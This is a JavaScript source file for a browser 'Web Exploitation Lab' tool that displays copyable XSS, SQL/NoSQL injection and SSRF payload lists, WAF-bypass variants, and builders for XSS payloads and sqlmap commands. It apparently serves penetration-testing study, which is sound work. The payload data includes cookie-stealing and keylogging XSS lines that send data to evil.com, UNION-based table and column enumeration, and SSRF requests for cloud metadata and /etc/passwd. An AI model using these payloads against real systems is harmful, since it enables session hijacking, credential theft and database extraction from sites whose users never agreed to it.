/* ==================== WEB EXPLOITATION LAB üï∑Ô∏èüíâ ==================== */
/* Interactive Web Vulnerability Testing & Payload Crafting */

window.WebExploitLab = {
    // --- STATE ---
    currentTab: 'xss',
    testResults: [],

    // --- XSS PAYLOADS ---
    xssPayloads: {
        basic: [
            { name: 'Alert Box', payload: '<script>alert(1)</script>', desc: 'Basic script injection' },
            { name: 'Image Error', payload: '<img src=x onerror=alert(1)>', desc: 'Event handler injection' },
            { name: 'SVG OnLoad', payload: '<svg onload=alert(1)>', desc: 'SVG event injection' },
            { name: 'Body OnLoad', payload: '<body onload=alert(1)>', desc: 'Body event injection' },
            { name: 'Input Onfocus', payload: '<input onfocus=alert(1) autofocus>', desc: 'Auto-triggering input' }
        ],
        advanced: [
            { name: 'Cookie Stealer', payload: '<script>new Image().src="http://evil.com/?c="+document.cookie</script>', desc: 'Exfiltrate cookies' },
            { name: 'Keylogger', payload: '<script>document.onkeypress=function(e){new Image().src="http://evil.com/?k="+e.key}</script>', desc: 'Capture keystrokes' },
            { name: 'DOM Manipulation', payload: '<script>document.body.innerHTML="<h1>Hacked</h1>"</script>', desc: 'Page defacement' },
            { name: 'Fetch API', payload: '<script>fetch("http://evil.com",{method:"POST",body:document.cookie})</script>', desc: 'Modern exfiltration' }
        ],
        bypass: [
            { name: 'No Quotes', payload: '<img src=x onerror=alert`1`>', desc: 'Template literal bypass' },
            { name: 'Case Bypass', payload: '<ScRiPt>alert(1)</sCrIpT>', desc: 'Mixed case bypass' },
            { name: 'Double Encode', payload: '%253Cscript%253Ealert(1)%253C/script%253E', desc: 'Double URL encoding' },
            { name: 'Unicode', payload: '<script>\\u0061lert(1)</script>', desc: 'Unicode escape' },
            { name: 'HTML Entities', payload: '&lt;script&gt;alert(1)&lt;/script&gt;', desc: 'Entity bypass attempt' }
        ],
        polyglot: [
            { name: 'Polyglot #1', payload: 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e', desc: 'Multi-context polyglot' }
        ]
    },

    // --- SQLI PAYLOADS ---
    sqliPayloads: {
        detection: [
            { name: 'Single Quote', payload: "' OR '1'='1", desc: 'Basic detection' },
            { name: 'Double Quote', payload: '" OR "1"="1', desc: 'Alternative syntax' },
            { name: 'Comment', payload: "' OR 1=1--", desc: 'Comment termination' },
            { name: 'Integer', payload: '1 OR 1=1', desc: 'Numeric injection' },
            { name: 'Time Based', payload: "' AND SLEEP(5)--", desc: 'Blind detection' }
        ],
        union: [
            { name: 'Column Count', payload: "' ORDER BY 1,2,3,4--", desc: 'Find column count' },
            { name: 'Union Select', payload: "' UNION SELECT NULL,NULL,NULL--", desc: 'Union injection' },
            { name: 'Version', payload: "' UNION SELECT @@version,NULL,NULL--", desc: 'Get DB version' },
            { name: 'Tables', payload: "' UNION SELECT table_name,NULL FROM information_schema.tables--", desc: 'List tables' },
            { name: 'Columns', payload: "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--", desc: 'List columns' }
        ],
        bypass: [
            { name: 'Space Bypass', payload: "'/**/OR/**/1=1--", desc: 'Comment as space' },
            { name: 'Case Mixing', payload: "'UnIoN SeLeCt NULL--", desc: 'Mixed case' },
            { name: 'Double Encoding', payload: '%27%20OR%201=1--', desc: 'URL encoded' },
            { name: 'Hex Encoding', payload: "'OR 0x31=0x31--", desc: 'Hex values' }
        ],
        nosql: [
            { name: 'MongoDB Auth', payload: '{"username":{"$gt":""},"password":{"$gt":""}}', desc: 'MongoDB bypass' },
            { name: 'NoSQL $ne', payload: '{"username":"admin","password":{"$ne":"wrong"}}', desc: 'Not equal injection' },
            { name: 'NoSQL $regex', payload: '{"username":{"$regex":"^admin"}}', desc: 'Regex injection' }
        ]
    },

    // --- SSRF PAYLOADS ---
    ssrfPayloads: [
        { name: 'Localhost', payload: 'http://127.0.0.1/', desc: 'Local loopback' },
        { name: 'AWS Metadata', payload: 'http://169.254.169.254/latest/meta-data/', desc: 'AWS instance metadata' },
        { name: 'GCP Metadata', payload: 'http://metadata.google.internal/computeMetadata/v1/', desc: 'GCP metadata' },
        { name: 'Azure Metadata', payload: 'http://169.254.169.254/metadata/instance', desc: 'Azure IMDS' },
        { name: 'File Protocol', payload: 'file:///etc/passwd', desc: 'Local file read' },
        { name: 'Gopher', payload: 'gopher://127.0.0.1:6379/_INFO', desc: 'Redis via Gopher' },
        { name: 'Decimal IP', payload: 'http://2130706433/', desc: '127.0.0.1 as decimal' },
        { name: 'IPv6 Localhost', payload: 'http://[::1]/', desc: 'IPv6 loopback' },
        { name: 'Redirect Bypass', payload: 'http://evil.com/redirect?url=http://127.0.0.1/', desc: 'Open redirect chain' }
    ],

    // --- RENDER ---
    render() {
        return `
            <div class="exploit-app fade-in">
                <div class="exploit-header">
                    <div class="header-left">
                        <h1><i class="fas fa-spider"></i> Web Exploitation Lab</h1>
                        <p class="subtitle">Payload Crafting & Vulnerability Testing</p>
                    </div>
                    <div class="header-actions">
                        <button class="action-btn" onclick="WebExploitLab.openCheatsheet()">
                            <i class="fas fa-book"></i> Cheatsheet
                        </button>
                    </div>
                </div>

                <div class="exploit-tabs">
                    <div class="tab ${this.currentTab === 'xss' ? 'active' : ''}" onclick="WebExploitLab.switchTab('xss')">
                        <i class="fas fa-code"></i> XSS
                    </div>
                    <div class="tab ${this.currentTab === 'sqli' ? 'active' : ''}" onclick="WebExploitLab.switchTab('sqli')">
                        <i class="fas fa-database"></i> SQLi
                    </div>
                    <div class="tab ${this.currentTab === 'ssrf' ? 'active' : ''}" onclick="WebExploitLab.switchTab('ssrf')">
                        <i class="fas fa-server"></i> SSRF
                    </div>
                    <div class="tab ${this.currentTab === 'sandbox' ? 'active' : ''}" onclick="WebExploitLab.switchTab('sandbox')">
                        <i class="fas fa-flask"></i> Sandbox
                    </div>
                </div>

                <div class="exploit-content">
                    ${this.renderTabContent()}
                </div>
            </div>
            ${this.getStyles()}
        `;
    },

    renderTabContent() {
        switch (this.currentTab) {
            case 'xss': return this.renderXSS();
            case 'sqli': return this.renderSQLi();
            case 'ssrf': return this.renderSSRF();
            case 'sandbox': return this.renderSandbox();
            default: return '';
        }
    },

    renderXSS() {
        return `
            <div class="payload-section">
                <h2><i class="fas fa-code"></i> XSS Payload Arsenal</h2>
                
                <div class="payload-categories">
                    <div class="category">
                        <h3><i class="fas fa-seedling"></i> Basic Payloads</h3>
                        ${this.renderPayloadList(this.xssPayloads.basic)}
                    </div>
                    <div class="category">
                        <h3><i class="fas fa-bomb"></i> Advanced Payloads</h3>
                        ${this.renderPayloadList(this.xssPayloads.advanced)}
                    </div>
                    <div class="category">
                        <h3><i class="fas fa-shield-alt"></i> WAF Bypass</h3>
                        ${this.renderPayloadList(this.xssPayloads.bypass)}
                    </div>
                    <div class="category full-width">
                        <h3><i class="fas fa-magic"></i> Polyglots</h3>
                        ${this.renderPayloadList(this.xssPayloads.polyglot)}
                    </div>
                </div>

                <div class="custom-payload">
                    <h3><i class="fas fa-edit"></i> Custom Payload Builder</h3>
                    <div class="builder-row">
                        <select id="xss-event">
                            <option value="onerror">onerror</option>
                            <option value="onload">onload</option>
                            <option value="onclick">onclick</option>
                            <option value="onfocus">onfocus</option>
                            <option value="onmouseover">onmouseover</option>
                        </select>
                        <select id="xss-tag">
                            <option value="img">img</option>
                            <option value="svg">svg</option>
                            <option value="body">body</option>
                            <option value="input">input</option>
                            <option value="iframe">iframe</option>
                        </select>
                        <input type="text" id="xss-action" placeholder="alert(1)" value="alert(document.domain)">
                        <button onclick="WebExploitLab.buildXSS()"><i class="fas fa-hammer"></i> Build</button>
                    </div>
                    <div class="builder-output">
                        <code id="xss-output"></code>
                        <button onclick="WebExploitLab.copyOutput('xss-output')"><i class="fas fa-copy"></i></button>
                    </div>
                </div>
            </div>
        `;
    },

    renderSQLi() {
        return `
            <div class="payload-section">
                <h2><i class="fas fa-database"></i> SQL Injection Payloads</h2>
                
                <div class="payload-categories">
                    <div class="category">
                        <h3><i class="fas fa-search"></i> Detection</h3>
                        ${this.renderPayloadList(this.sqliPayloads.detection)}
                    </div>
                    <div class="category">
                        <h3><i class="fas fa-link"></i> UNION Based</h3>
                        ${this.renderPayloadList(this.sqliPayloads.union)}
                    </div>
                    <div class="category">
                        <h3><i class="fas fa-shield-alt"></i> Bypass Techniques</h3>
                        ${this.renderPayloadList(this.sqliPayloads.bypass)}
                    </div>
                    <div class="category">
                        <h3><i class="fas fa-leaf"></i> NoSQL Injection</h3>
                        ${this.renderPayloadList(this.sqliPayloads.nosql)}
                    </div>
                </div>

                <div class="sqli-builder">
                    <h3><i class="fas fa-wrench"></i> SQLMap Command Builder</h3>
                    <div class="builder-form">
                        <input type="text" id="sqlmap-url" placeholder="Target URL with parameter">
                        <select id="sqlmap-db">
                            <option value="">Auto-detect DB</option>
                            <option value="--dbms=mysql">MySQL</option>
                            <option value="--dbms=mssql">MSSQL</option>
                            <option value="--dbms=postgresql">PostgreSQL</option>
                            <option value="--dbms=oracle">Oracle</option>
                        </select>
                        <select id="sqlmap-level">
                            <option value="--level=1">Level 1 (Default)</option>
                            <option value="--level=3">Level 3</option>
                            <option value="--level=5">Level 5 (Max)</option>
                        </select>
                    </div>
                    <div class="sqlmap-options">
                        <label><input type="checkbox" id="opt-dbs" checked> --dbs</label>
                        <label><input type="checkbox" id="opt-tables"> --tables</label>
                        <label><input type="checkbox" id="opt-dump"> --dump</label>
                        <label><input type="checkbox" id="opt-batch"> --batch</label>
                        <label><input type="checkbox" id="opt-random-agent"> --random-agent</label>
                    </div>
                    <button onclick="WebExploitLab.buildSQLMap()"><i class="fas fa-terminal"></i> Generate Command</button>
                    <div class="sqlmap-output">
                        <code id="sqlmap-cmd">sqlmap -u "URL" --dbs</code>
                        <button onclick="WebExploitLab.copyOutput('sqlmap-cmd')"><i class="fas fa-copy"></i></button>
                    </div>
                </div>
            </div>
        `;
    },

    renderSSRF() {
        return `
            <div class="payload-section">
                <h2><i class="fas fa-server"></i> SSRF Payloads</h2>
                
                <div class="ssrf-info">
                    <p>Server-Side Request Forgery payloads for accessing internal resources</p>
                </div>

                <div class="payload-list full-list">
                    ${this.ssrfPayloads.map(p => `
                        <div class="payload-item">
                            <div class="payload-header">
                                <span class="payload-name">${p.name}</span>
                                <span class="payload-desc">${p.desc}</span>
                            </div>
                            <div class="payload-code">
                                <code>${this.escapeHtml(p.payload)}</code>
                                <button onclick="navigator.clipboard.writeText(\`${p.payload.replace(/`/g, '\\`')}\`)"><i class="fas fa-copy"></i></button>
                            </div>
                        </div>
                    `).join('')}
                </div>

                <div class="ssrf-tips">
                    <h3><i class="fas fa-lightbulb"></i> SSRF Testing Tips</h3>
                    <ul>
                        <li>Try different URL schemes: http, https, file, gopher, dict</li>
                        <li>Use IP obfuscation: decimal, octal, hex representations</li>
                        <li>Chain with open redirects on whitelisted domains</li>
                        <li>Try DNS rebinding for strict allowlists</li>
                        <li>Look for SSRF in PDF generators, image processors, webhooks</li>
                    </ul>
                </div>
            </div>
        `;
    },

    renderSandbox() {
        return `
            <div class="sandbox-section">
                <h2><i class="fas fa-flask"></i> Live Testing Sandbox</h2>
                <p class="sandbox-warning"><i class="fas fa-exclamation-triangle"></i> Test payloads safely in this isolated environment</p>

                <div class="sandbox-container">
                    <div class="sandbox-input">
                        <h3>XSS Test</h3>
                        <input type="text" id="sandbox-xss" placeholder="Enter XSS payload...">
                        <button onclick="WebExploitLab.testXSS()">Test</button>
                    </div>
                    <div class="sandbox-output" id="xss-sandbox-output">
                        <p>Output will appear here (sanitized)</p>
                    </div>
                </div>

                <div class="sandbox-container">
                    <div class="sandbox-input">
                        <h3>Encoding Tools</h3>
                        <textarea id="encode-input" placeholder="Text to encode..."></textarea>
                        <div class="encode-buttons">
                            <button onclick="WebExploitLab.encode('url')">URL Encode</button>
                            <button onclick="WebExploitLab.encode('html')">HTML Encode</button>
                            <button onclick="WebExploitLab.encode('base64')">Base64</button>
                            <button onclick="WebExploitLab.encode('hex')">Hex</button>
                        </div>
                    </div>
                    <div class="sandbox-output">
                        <code id="encode-output"></code>
                    </div>
                </div>
            </div>
        `;
    },

    renderPayloadList(payloads) {
        return `
            <div class="payload-list">
                ${payloads.map(p => `
                    <div class="payload-item">
                        <div class="payload-header">
                            <span class="payload-name">${p.name}</span>
                            <span class="payload-desc">${p.desc}</span>
                        </div>
                        <div class="payload-code">
                            <code>${this.escapeHtml(p.payload)}</code>
                            <button onclick="navigator.clipboard.writeText(\`${p.payload.replace(/`/g, '\\`').replace(/\\/g, '\\\\')}\`)"><i class="fas fa-copy"></i></button>
                        </div>
                    </div>
                `).join('')}
            </div>
        `;
    },

    // --- ACTIONS ---
    switchTab(tab) {
        this.currentTab = tab;
        this.reRender();
    },

    buildXSS() {
        const event = document.getElementById('xss-event').value;
        const tag = document.getElementById('xss-tag').value;
        const action = document.getElementById('xss-action').value;

        let payload = '';
        if (tag === 'img') payload = `<img src=x ${event}=${action}>`;
        else if (tag === 'svg') payload = `<svg ${event}=${action}>`;
        else if (tag === 'body') payload = `<body ${event}=${action}>`;
        else if (tag === 'input') payload = `<input ${event}=${action} autofocus>`;
        else if (tag === 'iframe') payload = `<iframe src="javascript:${action}">`;

        document.getElementById('xss-output').textContent = payload;
    },

    buildSQLMap() {
        const url = document.getElementById('sqlmap-url').value || 'http://target.com/page?id=1';
        const db = document.getElementById('sqlmap-db').value;
        const level = document.getElementById('sqlmap-level').value;

        let cmd = `sqlmap -u "${url}"`;
        if (db) cmd += ` ${db}`;
        cmd += ` ${level}`;
        if (document.getElementById('opt-dbs').checked) cmd += ' --dbs';
        if (document.getElementById('opt-tables').checked) cmd += ' --tables';
        if (document.getElementById('opt-dump').checked) cmd += ' --dump';
        if (document.getElementById('opt-batch').checked) cmd += ' --batch';
        if (document.getElementById('opt-random-agent').checked) cmd += ' --random-agent';

        document.getElementById('sqlmap-cmd').textContent = cmd;
    },

    testXSS() {
        const payload = document.getElementById('sandbox-xss').value;
        const output = document.getElementById('xss-sandbox-output');
        // Sanitize and show what would be rendered
        output.innerHTML = `<p><strong>Sanitized:</strong> ${this.escapeHtml(payload)}</p>
                           <p><strong>Length:</strong> ${payload.length} chars</p>
                           <p><strong>Tags detected:</strong> ${(payload.match(/<[^>]*>/g) || []).length}</p>`;
    },

    encode(type) {
        const input = document.getElementById('encode-input').value;
        let output = '';
        switch (type) {
            case 'url': output = encodeURIComponent(input); break;
            case 'html': output = input.replace(/[<>&"']/g, c => ({ '<': '&lt;', '>': '&gt;', '&': '&amp;', '"': '&quot;', "'": '&#39;' }[c])); break;
            case 'base64': output = btoa(input); break;
            case 'hex': output = Array.from(input).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join(''); break;
        }
        document.getElementById('encode-output').textContent = output;
    },

    copyOutput(id) {
        const text = document.getElementById(id).textContent;
        navigator.clipboard.writeText(text);
    },

    openCheatsheet() {
        window.open('https://portswigger.net/web-security/cross-site-scripting/cheat-sheet', '_blank');
    },

    escapeHtml(str) {
        return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
    },

    reRender() {
        const app = document.querySelector('.exploit-app');
        if (app) app.outerHTML = this.render();
    },

    getStyles() {
        return `<style>
            .exploit-app { min-height: calc(100vh - 60px); background: linear-gradient(135deg, #0a0a12 0%, #1a1a2e 100%); color: #e0e0e0; padding: 25px; font-family: 'Segoe UI', sans-serif; }
            .exploit-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
            .exploit-header h1 { margin: 0; color: #e74c3c; font-size: 1.8rem; }
            .exploit-header .subtitle { color: #888; margin: 5px 0 0; }
            .action-btn { background: rgba(231,76,60,0.2); border: 1px solid #e74c3c; padding: 10px 20px; border-radius: 8px; color: #e74c3c; cursor: pointer; }

            .exploit-tabs { display: flex; gap: 5px; margin-bottom: 20px; }
            .tab { padding: 10px 18px; border-radius: 8px; cursor: pointer; transition: 0.2s; color: #888; display: flex; align-items: center; gap: 8px; }
            .tab:hover { color: #fff; background: rgba(255,255,255,0.05); }
            .tab.active { background: #e74c3c; color: #fff; }

            .payload-section h2 { color: #e74c3c; margin: 0 0 20px; }
            .payload-categories { display: grid; grid-template-columns: repeat(2, 1fr); gap: 20px; margin-bottom: 25px; }
            .category { background: rgba(0,0,0,0.3); padding: 20px; border-radius: 12px; }
            .category.full-width { grid-column: 1 / -1; }
            .category h3 { color: #e74c3c; margin: 0 0 15px; font-size: 1rem; }
            
            .payload-list { display: flex; flex-direction: column; gap: 10px; }
            .payload-list.full-list { background: rgba(0,0,0,0.3); padding: 20px; border-radius: 12px; }
            .payload-item { background: rgba(255,255,255,0.03); padding: 12px; border-radius: 8px; }
            .payload-header { display: flex; justify-content: space-between; margin-bottom: 8px; }
            .payload-name { color: #fff; font-weight: 500; }
            .payload-desc { color: #666; font-size: 0.8rem; }
            .payload-code { display: flex; align-items: center; gap: 10px; background: #0a0a12; padding: 10px; border-radius: 5px; }
            .payload-code code { flex: 1; color: #f39c12; font-family: monospace; font-size: 0.85rem; word-break: break-all; }
            .payload-code button { background: transparent; border: none; color: #666; cursor: pointer; padding: 5px; }
            .payload-code button:hover { color: #e74c3c; }

            .custom-payload, .sqli-builder { background: rgba(0,0,0,0.3); padding: 20px; border-radius: 12px; }
            .custom-payload h3, .sqli-builder h3 { color: #e74c3c; margin: 0 0 15px; }
            .builder-row, .builder-form { display: flex; gap: 10px; margin-bottom: 15px; flex-wrap: wrap; }
            .builder-row select, .builder-row input, .builder-form input, .builder-form select { padding: 10px; background: #1a1a2e; border: 1px solid #333; border-radius: 8px; color: #fff; }
            .builder-row button, .sqli-builder > button { padding: 10px 20px; background: #e74c3c; border: none; border-radius: 8px; color: #fff; cursor: pointer; }
            .builder-output, .sqlmap-output { display: flex; align-items: center; gap: 10px; background: #0a0a12; padding: 15px; border-radius: 8px; margin-top: 10px; }
            .builder-output code, .sqlmap-output code { flex: 1; color: #2ecc71; font-family: monospace; }
            
            .sqlmap-options { display: flex; flex-wrap: wrap; gap: 15px; margin-bottom: 15px; }
            .sqlmap-options label { color: #aaa; cursor: pointer; }

            .ssrf-info { background: rgba(231,76,60,0.1); padding: 15px; border-radius: 8px; margin-bottom: 20px; border-left: 3px solid #e74c3c; }
            .ssrf-tips { background: rgba(0,0,0,0.3); padding: 20px; border-radius: 12px; margin-top: 20px; }
            .ssrf-tips h3 { color: #ffd700; margin: 0 0 15px; }
            .ssrf-tips ul { margin: 0; padding-left: 20px; color: #aaa; }
            .ssrf-tips li { margin: 8px 0; }

            .sandbox-section h2 { color: #e74c3c; margin: 0 0 10px; }
            .sandbox-warning { color: #f39c12; margin-bottom: 20px; }
            .sandbox-container { background: rgba(0,0,0,0.3); padding: 20px; border-radius: 12px; margin-bottom: 20px; }
            .sandbox-input h3 { color: #e74c3c; margin: 0 0 15px; }
            .sandbox-input input, .sandbox-input textarea { width: 100%; padding: 12px; background: #1a1a2e; border: 1px solid #333; border-radius: 8px; color: #fff; margin-bottom: 10px; }
            .sandbox-input textarea { height: 80px; }
            .sandbox-input button { padding: 10px 20px; background: #e74c3c; border: none; border-radius: 8px; color: #fff; cursor: pointer; margin-right: 10px; margin-bottom: 10px; }
            .encode-buttons { display: flex; flex-wrap: wrap; gap: 10px; }
            .sandbox-output { background: #0a0a12; padding: 15px; border-radius: 8px; margin-top: 10px; min-height: 60px; }
            .sandbox-output code { color: #2ecc71; font-family: monospace; word-break: break-all; }

            @media (max-width: 900px) { .payload-categories { grid-template-columns: 1fr; } }
        </style>`;
    }
};

function pageWebExploitLab() {
    return WebExploitLab.render();
}
